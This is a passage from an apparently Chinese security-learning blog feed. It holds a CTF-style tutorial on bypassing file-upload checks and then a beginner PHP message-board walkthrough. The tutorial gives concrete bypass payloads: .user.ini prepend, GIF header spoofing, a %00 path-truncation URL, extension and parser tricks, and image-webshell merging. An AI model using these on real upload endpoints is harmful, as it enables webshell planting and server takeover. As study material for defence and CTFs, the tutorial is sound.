title="利用"></a>利用</h4><p>先上传a.user.ini.jpg文件，内容：</p><p><code>GIF89a</code><br><code>//auto_append_file=test1.png</code><br><code>auto_prepend_file=test1.png</code></p><p>第一行绕过文件头检测，第二行可以不写。</p><p>bp抓包改名为<code>.user.ini</code></p><p>再上传<code>test1.png</code>，没必要改名，其内容会被当做PHP文件内容执行。</p><p>这句话：auto_prepend_file表示在php程序加载第一个php代码前加载的php文件</p><p>我们要先找到一个php文件，自己传会被Unicode化，那看看是否有原有的：</p><p><code>url/upload/index.php</code>蚁剑连</p><h3 id="后端检测-文件头检测漏洞"><a href="#后端检测-文件头检测漏洞" class="headerlink" title="后端检测_文件头检测漏洞"></a>后端检测_文件头检测漏洞</h3><h4 id="基础-3"><a href="#基础-3" class="headerlink" title="基础"></a>基础</h4><h5 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h5><blockquote><p>在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）实际上都有一片区域来显示这个文件的实际用法，这就是文件头标志。我们可以通过16进制编辑器打开文件，添加服务器允许的文件头以绕过检测。</p></blockquote><h5 id="常见文件头"><a href="#常见文件头" class="headerlink" title="常见文件头"></a>常见文件头</h5><p> GIF：<code>47 49 46 38 39 61</code> png：<code>89 50 4E 47 0D 0A 1A 0A</code> JPG：<code>FF D8 FF E0 00 10 4A 46 49 46</code></p><p>GIF 文件头解码结果：<code>GIF89a</code> PNG 文件头解码结果：<code>\x89PNG\r\n\x1A\n</code> JPG 文件头解码结果：<code>ÿØÿà\x00\x10JFIF</code></p><blockquote><p> 在进行<code>文件头绕过</code>时，我们可以把上面的<code>文件头</code>添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的。</p></blockquote><p>附：最好文件头和代码（木马）之间有个空格</p><h3 id="后端检测-00截断"><a href="#后端检测-00截断" class="headerlink" title="后端检测_00截断"></a>后端检测_00截断</h3><h4 id="基础-4"><a href="#基础-4" class="headerlink" title="基础"></a>基础</h4><blockquote><p>虽然web应用做了校验，但是由于文件上传后的<code>路径用户可以控制</code>，攻击者可以利用手动添加字符串标识符<code>0X00</code>的方式来将后面的拼接的内容<code>进行截断</code>，导致后面的内容无效，而且后面的内容又可以帮助我们绕过黑白名单的检测。</p></blockquote><p>可是0x00跟%00有什么关系呢？</p><p>%00经过URL解码后就是0x00，二者的意思都是空字符，表示一个字符串的结束。我们就可以根据源码利用%00实现.php后缀</p><h4 id="示例：ctfhub"><a href="#示例：ctfhub" class="headerlink" title="示例：ctfhub"></a>示例：ctfhub</h4><h5 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h5><!--if (!empty($_POST['submit'])) {    $name = basename($_FILES['file']['name']);    $info = pathinfo($name);    $ext = $info['extension'];    $whitelist = array("jpg", "png", "gif");    if (in_array($ext, $whitelist)) {        $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;        if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) {            echo "<script>alert('上传成功')</script>";        } else {            echo "<script>alert('上传失败')</script>";        }    } else {        echo "文件类型不匹配";    }}--><p>最关键的是这句代码：</p><p><code>$des = $_GET[&#39;road&#39;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;</code></p><p>只要在road的值里使用空字符即可，因为GET会编码，所以用%00</p><p>payload：</p><p><code>?road=/var/www/html/upload/test1.php%00</code></p><p>至于下面的文件名，最多判断一下后缀，把后缀补过去也会被%00截断，所以在白名单的范围里里命名即可</p><h3 id="后端检测-后缀名检测漏洞"><a href="#后端检测-后缀名检测漏洞" class="headerlink" title="后端检测_后缀名检测漏洞"></a>后端检测_后缀名检测漏洞</h3><h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><blockquote><p>通常是针对文件的扩展名后缀进行检测，主要是通过黑白名单进行过滤检测，如果不符全过滤规则则不允许上传。</p></blockquote><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><blockquote><p>一般有个专门的 <code>blacklist 文件</code>，里面会包含常见的危险脚本文件。</p></blockquote><h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>有时后端会把敏感字符替换为空，这就可以双写绕过了，比如<code>name.phphpp</code>。</p><h5 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h5><h6 id="htaccess文件解析漏洞-apache解析漏洞"><a href="#htaccess文件解析漏洞-apache解析漏洞" class="headerlink" title=".htaccess文件解析漏洞- apache解析漏洞"></a><code>.htaccess</code>文件解析漏洞- apache解析漏洞</h6><p>利用.htaccess可以使其他类型的文件按照PHP文件来执行</p><p>apache：<a href="https://zhuanlan.zhihu.com/p/564753382">技术向！Apache解析漏洞 - 知乎 (zhihu.com)</a></p><ol><li>简单来说就是一个配置（AddHandler）：后缀可以是其他的，只要文件名里有<code>.php</code>，就按照PHP文件执行</li><li>使用<code>.php\x0a</code>，具体看上面链接</li></ol><h6 id="IIS7-0-IIS7-5-Nginx的解析漏洞"><a href="#IIS7-0-IIS7-5-Nginx的解析漏洞" class="headerlink" title="IIS7.0 | IIS7.5 | Nginx的解析漏洞"></a>IIS7.0 | IIS7.5 | Nginx的解析漏洞</h6><blockquote><p>Nginx拿到文件路径（更专业的说法是URI）&#x2F;test.jpg&#x2F;test.php后，一看后缀是.php，便认为该文件是php文件，转交给php去处理。php一看&#x2F;test.jpg&#x2F;test.php不存在，便删去最后的&#x2F;test.php，又看&#x2F;test.jpg存在，便把&#x2F;test.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件，于是返回Access denied。<br>  这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。开启这一选项PHP可以对文件路径进行修理。<br>  举个例子，当php遇到文件路径&#x2F;1.jpg&#x2F;2.txt&#x2F;3.php时，若&#x2F;1.jpg&#x2F;2.txt&#x2F;3.php不存在，则会去掉最后的&#x2F;3.php，然后判断&#x2F;1.jpg&#x2F;2.txt是否存在，若存在，则把&#x2F;1.jpg&#x2F;2.txt当做文件&#x2F;1.jpg&#x2F;2.txt&#x2F;3.php，若&#x2F;1.jpg&#x2F;2.txt仍不存在，则继续去掉&#x2F;2.txt，以此类推。</p><p>原文链接：<a href="https://blog.csdn.net/weixin_45588247/article/details/118889668">https://blog.csdn.net/weixin_45588247/article/details/118889668</a></p></blockquote><p>简单来说，文件我们可以在存在的文件路径后面加一个虚假的&#x2F;name.php，这个存在的文件如果是一个图片马，就可能实现getshell。</p><h6 id="IIS6-0-IIS5-x解析漏洞解析漏洞"><a href="#IIS6-0-IIS5-x解析漏洞解析漏洞" class="headerlink" title="IIS6.0&#x2F;IIS5.x解析漏洞解析漏洞"></a>IIS6.0&#x2F;IIS5.x解析漏洞解析漏洞</h6><blockquote><ul><li>上传文件名：xxx.asp;.jpg</li></ul><p> 服务器默认不解析;号后面的内容，因此xxx.asp;.jpg被当做asp文件解析</p><ul><li>向xxx.asp目录下面上传xxx.jpg</li></ul><p> 服务器会将xxx.asp目录下的文件都当做asp文件解析</p></blockquote><p><a href="https://blog.csdn.net/song123sh/article/details/123513911">文件上传之IIS6.0解析漏洞_iis6解析漏洞利用-CSDN博客</a></p><p>第一种是文件解析漏洞，如果文件名被修改，可以采用第二种：目录解析漏洞。目录解析漏洞不需要实际的后缀，只需要知道文件名即可</p><h5 id="黑名单的漏网之鱼"><a href="#黑名单的漏网之鱼" class="headerlink" title="黑名单的漏网之鱼"></a>黑名单的漏网之鱼</h5><blockquote><p>比如: <code>asa</code>和<code>cer</code>之类 <code>asp:</code> <code>asa</code> <code>cer</code> <code>aspx</code> <code>jsp:</code> <code>jspx</code> <code>jspf</code> <code>php:</code> <code>php</code> <code>php3</code> <code>php4</code> <code>php5</code> <code>phtml</code> <code>pht</code> <code>exe:</code> <code>exee</code> </p></blockquote><h5 id="利用Windows的命名机制"><a href="#利用Windows的命名机制" class="headerlink" title="利用Windows的命名机制"></a>利用Windows的命名机制</h5><blockquote><p><code>shell.php.</code>  <code>shell.php空格</code>  <code>shell.php:1.jpg</code>  <code>shell. php::$DATA</code>  <code>shell.php:1.jpg</code>  在windows中，后缀名后面的点和空格都会被删除掉。</p></blockquote><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><blockquote><p>一般有个专门的 <code>whitelist 文件</code>，里面会包含的正常文件。</p></blockquote><p>绕过同黑名单</p><h3 id="后端检测-文件头检测漏洞-1"><a href="#后端检测-文件头检测漏洞-1" class="headerlink" title="后端检测_文件头检测漏洞"></a>后端检测_文件头检测漏洞</h3><h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><blockquote><p>        一般文件内容验证使用<code>getimagesize函数</code>检测,会判断文件是否是一个有效的文件图片,如果是,则允许上传,否则的话不允许上传。  本实验就是将一句话木马插入到一个[合法]的图片文件当中,然后用webshell管理工具进行远程连接。</p></blockquote><p>指令：<code>copy 1.jpg /b + 2.php /a 3.php</code></p><blockquote><p>&#x2F;b:指定以二进制格式复制、合并文件，用于图像或者声音类文件</p><p>&#x2F;a:指定以ascii格式复制、合并文件用于txt等文本类文件</p></blockquote><blockquote><p><strong>这条命令的意思是：通过<code>copy命令</code>，把<code>a.png</code>图片文件，以二进制文件形式添加到<code>a.php</code>文件中，以<code>ASCII文本文件</code>形式输出为<code>3.php</code>文件。</strong></p></blockquote><p>解析图片马需要将图片马被PHP一下，比如文件包含。</p><blockquote><p>    一般解析图片马需要结合<code>解析漏洞</code>或者<code>文件包含</code>才能解析图片马；</p></blockquote><h3 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h3><p>我简单称之为：卡空子。当文件的判断需要过多的时间时，可以卡那个时间间隔执行木马。</p><blockquote><p>由于服务器并发处理(同时)多个请求，假如<code>a用户</code>上传了木马文件，由于代码执行需要时间，在此过程中<code>b用户</code>访问了<code>a用户</code>上传的文件，会有以下三种情况： </p><p>1.访问时间点在上传成功之前，没有此文件。 </p><p>2.访问时间点在刚上传成功但还没有进行判断，该文件存在。 </p><p>3.访问时间点在判断之后，文件被删除，没有此文件。</p></blockquote><h3 id="二次渲染漏洞"><a href="#二次渲染漏洞" class="headerlink" title="二次渲染漏洞"></a>二次渲染漏洞</h3><h4 id="二次渲染原理："><a href="#二次渲染原理：" class="headerlink" title="二次渲染原理："></a>二次渲染原理：</h4><blockquote><p>                 在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。</p></blockquote><h4 id="绕过："><a href="#绕过：" class="headerlink" title="绕过："></a>绕过：</h4><blockquote><p>1、配合文件包含漏洞：  将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取webshell。  2、可以配合条件竞争：  这里二次渲染的逻辑存在漏洞，先将文件上传，之后再判断，符合就保存，不符合删除，可利用条件竞争来进行爆破上传</p></blockquote><h4 id="如何判断图片是否进行了二次处理？"><a href="#如何判断图片是否进行了二次处理？" class="headerlink" title="如何判断图片是否进行了二次处理？"></a>如何判断图片是否进行了二次处理？</h4><blockquote><p>     对比要与上传后的图片大小，使用<code>16进制编辑器</code>打开图片查看上传后保留了哪些数据，</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP message board</title>
      <link href="/2024/03/18/PHP-message-board/"/>
      <url>/2024/03/18/PHP-message-board/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP留言板"><a href="#PHP留言板" class="headerlink" title="PHP留言板"></a>PHP留言板</h1><h2 id="一-数据库启动-bd-php"><a href="#一-数据库启动-bd-php" class="headerlink" title="一.数据库启动(bd.php)"></a>一.数据库启动(bd.php)</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>;<span class="variable">$username</span> = <span class="string">&#x27;root&#x27;</span>;<span class="variable">$password</span> = <span class="string">&#x27;&#x27;</span>;<span class="variable">$database</span> = <span class="string">&#x27;ROIS_PHP&#x27;</span>;<span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$host</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$database</span>);<span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;connect_error) &#123;    <span class="keyword">die</span>(<span class="string">&#x27;Connection failed：&#x27;</span>. <span class="variable">$conn</span>-&gt;connect_error);&#125;<span class="meta">?&gt;</span></code></pre><h3 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h3><p>四个配置没啥说的</p><p>创建$conn对象实现MySQL数据库操作：new mysqli()</p><p>connect_error是$conn的一个属性</p><h2 id="二-注册账户-register-php"><a href="#二-注册账户-register-php" class="headerlink" title="二.注册账户(register.php)"></a>二.注册账户(register.php)</h2><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="title function_ invoke__">session_start</span>();<span class="keyword">require_once</span> <span class="string">&#x27;db.php&#x27;</span>;<span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];    <span class="variable">$password</span> = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], PASSWORD_BCRYPT);    <span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;INSERT INTO users (username, password) values (?, ?)&#x27;</span>);    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;ss&#x27;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);    <span class="keyword">if</span>(<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>()) &#123;        <span class="comment">//echo &#x27;Registration successful. &lt;a href=&quot;login.php&quot;&gt;Login&lt;/a&gt;&#x27;;</span>        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: login.php&#x27;</span>);    &#125; <span class="keyword">else</span> &#123;        <span class="keyword">echo</span> <span class="string">&#x27;Registration failed. Please try again.&#x27;</span>;    &#125;    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">close</span>();&#125;<span class="meta">?&gt;</span>&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;    &lt;title&gt;REGISTER&lt;/title&gt;    &lt;style&gt;        body&#123;            text-align: center;            background-image: <span class="title function_ invoke__">url</span>(<span class="string">&quot;./1.jpg&quot;</span>);            background-size: auto <span class="number">870</span>px;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;也许你想要一个账号&lt;/h1&gt;    &lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;&quot;</span>&gt;        你想要个名字：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> required&gt;        你又多了个蜜🐎：&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> required&gt;        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;点我一下&quot;</span>&gt;    &lt;/form&gt;&lt;br&gt;    &lt;a href=<span class="string">&quot;login.php&quot;</span>&gt;登入哦&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="学习-1"><a href="#学习-1" class="headerlink" title="学习"></a>学习</h3><p><strong>session_start()<strong>函数开启或恢复会话，之后可以使用</strong>$_SESSION</strong>超全局数组</p><p><strong><code>require_once</code></strong> 是 PHP 中用于包含文件的语句，它确保被包含的文件在整个脚本执行过程中只被包含一次，即使在多个地方调用也不会重复包含。</p><p>password_hash($pwd, method)，使密码哈希化，保证密码安全</p><p>预编译：</p><p>准备：$stmt &#x3D; $conn-&gt;prepare($str);其中变量部分用 <strong>?</strong> 占位</p><p>插入：$stmt-&gt;bind_param(‘model’, var1，···，varn);</p><p>执行：$stmt-&gt;excute();</p><p>绑定：$stmt-&gt;bind_result($a,$b,···);</p><p>传递：$stmt-&gt;fetch;</p><p>关闭：$stmt-&gt;close();</p><p>header(‘Location: example.php’)</p><blockquote><p><code>header()</code> 函数是 PHP 中用于发送原始的 HTTP 头的函数。它通常用于在服务器端发送 HTTP 头信息，如设置重定向、设置页面编码、设置缓存控制等。这些头信息会在服务器响应浏览器请求时一同发送给浏览器。</p><p>基本的语法为：</p><pre><code class="highlight plaintext">phpCopy codeheader(header, replace, http_response_code);</code></pre><ul><li><strong><code>header</code>：</strong> 要发送的头信息，形式为 “header_name: header_value”。例如，<code>header(&#39;Content-Type: text/html&#39;);</code> 表示设置响应内容的类型为 HTML。</li><li><strong><code>replace</code>：</strong> 一个可选的布尔参数，指示是否替换之前相同头的值。默认是 <code>true</code>，表示替换；如果设置为 <code>false</code>，则会追加到之前相同头的值后面。</li><li><strong><code>http_response_code</code>：</strong> 一个可选的 HTTP 响应状态码。如果提供了该参数，它会替代之前设置的响应状态码。</li></ul></blockquote><h2 id="三-登入账户-login-php"><a href="#三-登入账户-login-php" class="headerlink" title="三.登入账户(login.php)"></a>三.登入账户(login.php)</h2><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="title function_ invoke__">session_start</span>();<span class="keyword">require_once</span> <span class="string">&#x27;db.php&#x27;</span>;<span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];    <span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT id, username, password FROM users WHERE username=?&#x27;</span>);    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;s&#x27;</span>, <span class="variable">$username</span>);    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();<span class="comment">//启动</span>    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$id</span>, <span class="variable">$username</span>, <span class="variable">$hash_password</span>);    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();    <span class="keyword">if</span>(<span class="title function_ invoke__">password_verify</span>(<span class="variable">$password</span>, <span class="variable">$hash_password</span>)) &#123;        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;        <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] = <span class="variable">$id</span>;        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: message.php&#x27;</span>);        <span class="keyword">exit</span>();<span class="comment">//终止脚本运行</span>    &#125; <span class="keyword">else</span> &#123;        <span class="keyword">echo</span> <span class="string">&#x27;总有一个错了吧，高考不会给你机会哈哈哈哈哈······&#x27;</span>;    &#125;    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">close</span>();&#125;<span class="meta">?&gt;</span>&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;    &lt;title&gt;Login&lt;/title&gt;    &lt;style&gt;        body&#123;            text-align: center;            background-image: <span class="title function_ invoke__">url</span>(<span class="string">&quot;./1.jpg&quot;</span>);            background-size: auto <span class="number">870</span>px;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;看来你是想进来看看的，帅气的我答应了&lt;/h1&gt;    &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;        你有个名字：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;        你的蜜🐎呢：&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;点我一下&quot;</span>&gt;    &lt;/form&gt;    &lt;br&gt;    &lt;a href=<span class="string">&quot;register.php&quot;</span>&gt;注册一个呗&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="学习-2"><a href="#学习-2" class="headerlink" title="学习"></a>学习</h3><p>哈希密码验证：password_verify($password, $hash_password)</p><blockquote><p>语法：bool password_verify ( string $password , string $hash )</p><p>password_verify（） 函数用于验证密码是否和散列值匹配。</p><ul><li>password： 用户的密码。</li><li>散 列： 一个由 <a href="https://www.runoob.com/php/php-password_hash.html">password_hash（）</a> 创建的散列值。</li></ul></blockquote><h2 id="留言-message-php"><a href="#留言-message-php" class="headerlink" title="留言(message.php)"></a>留言(message.php)</h2><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="title function_ invoke__">session_start</span>();<span class="keyword">require_once</span> <span class="string">&#x27;db.php&#x27;</span>;<span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>])) &#123;    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: login.php&#x27;</span>);    <span class="keyword">exit</span>();&#125;<span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;    <span class="variable">$user_id</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>];    <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);    <span class="variable">$to_user</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;to_user&#x27;</span>]);    <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];    <span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;INSERT INTO messages (user_id, message, to_user, post_user) VALUES (?, ?, ?, ?)&#x27;</span>);    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;isss&#x27;</span>, <span class="variable">$user_id</span>, <span class="variable">$message</span>, <span class="variable">$to_user</span>, <span class="variable">$username</span>);    <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>()) &#123;        <span class="keyword">echo</span> <span class="string">&#x27;我记住了&#x27;</span>;    &#125; <span class="keyword">else</span> &#123;        <span class="keyword">echo</span> <span class="string">&quot;你失败了，反正不是我的原因&quot;</span>;    &#125;    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">close</span>();&#125;<span class="meta">?&gt;</span>&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;&lt;title&gt;MESSAGE&lt;/title&gt;&lt;style&gt;    body&#123;        text-align: center;        background-image: <span class="title function_ invoke__">url</span>(<span class="string">&quot;./1.jpg&quot;</span>);        background-size: auto <span class="number">870</span>px;    &#125;&lt;/style&gt;&lt;body&gt;    &lt;h2&gt;Welcome, <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]);<span class="meta">?&gt;</span>&lt;/h2&gt;    &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;        写给谁：&lt;select name=<span class="string">&quot;to_user&quot;</span>&gt;            <span class="meta">&lt;?php</span>            <span class="variable">$usernames</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;SELECT username FROM users&#x27;</span>);            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$usernames</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;                <span class="keyword">echo</span> <span class="string">&#x27;&lt;option value=&quot;&#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;/option&gt;&#x27;</span>;            &#125; <span class="meta">?&gt;</span>        &lt;/select&gt;        &lt;br&gt;&lt;br&gt;        &lt;label <span class="keyword">for</span>=<span class="string">&quot;message&quot;</span>&gt;写什么：&lt;/label&gt;        &lt;textarea name=<span class="string">&quot;message&quot;</span> required&gt;&lt;/textarea&gt;        &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;    &lt;/form&gt;    &lt;h3&gt;康康大家给你的留言&lt;/h3&gt;    <span class="meta">&lt;?php</span>    <span class="variable">$stmt_1</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT message, post_user FROM messages WHERE to_user = ?&#x27;</span>);    <span class="variable">$stmt_1</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;s&#x27;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]);    <span class="variable">$stmt_1</span>-&gt;<span class="title function_ invoke__">execute</span>();    <span class="variable">$result</span> = <span class="variable">$stmt_1</span>-&gt;<span class="title function_ invoke__">get_result</span>();    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;        <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$row</span>[<span class="string">&#x27;post_user&#x27;</span>]).<span class="string">&#x27;：&#x27;</span>;        <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$row</span>[<span class="string">&#x27;message&#x27;</span>]).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;&#125;    <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">close</span>();    <span class="meta">?&gt;</span>    &lt;br&gt;    &lt;h3&gt;公共留言&lt;/h3&gt;    <span class="meta">&lt;?php</span>    <span class="variable">$str</span> = <span class="string">&quot;SELECT message, post_user FROM messages WHERE to_user = &#x27;全部&#x27;&quot;</span>;    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$str</span>);    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;    <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$row</span>[<span class="string">&#x27;post_user&#x27;</span>]).<span class="string">&#x27;：&#x27;</span>;    <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$row</span>[<span class="string">&#x27;message&#x27;</span>]).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;&#125;    <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">close</span>();    <span class="meta">?&gt;</span>    &lt;br&gt;    &lt;a href=<span class="string">&quot;logout.php&quot;</span>&gt;也许你想退出了&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="学习-3"><a href="#学习-3" class="headerlink" title="学习"></a>学习</h3><p>细讲一下：</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="variable">$usernames</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;SELECT username FROM users&#x27;</span>);<span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$usernames</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;    <span class="keyword">echo</span> <span class="string">&#x27;&lt;option value=&quot;&#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;/option&gt;&#x27;</span>;&#125; <span class="meta">?&gt;</span></code></pre><p>fetch_assoc()函数：</p><blockquote><p><code>fetch_assoc()</code> 是 PHP 中用于从数据库中获取关联数组的函数。这个函数通常与 MySQLi（MySQL Improved）扩展一起使用，用于执行查询并返回结果集中的下一行作为关联数组。</p></blockquote><p>echo：</p><p>echo可以用来实现PHP与HTML的拼接，因为echo的字符串输出在HTML文档，会执行相关的操作。</p><p>htmlspecialchars()：</p><blockquote><p><code>htmlspecialchars</code> 是一个用于在处理 HTML 输出时防止跨站脚本攻击（XSS）的 PHP 函数。该函数将字符串中的特殊字符转换为对应的 HTML 实体，从而确保这些字符不被解释为 HTML 标记，而是以原始的文本形式显示在页面上。</p></blockquote><h2 id="注销账户-logout-php"><a 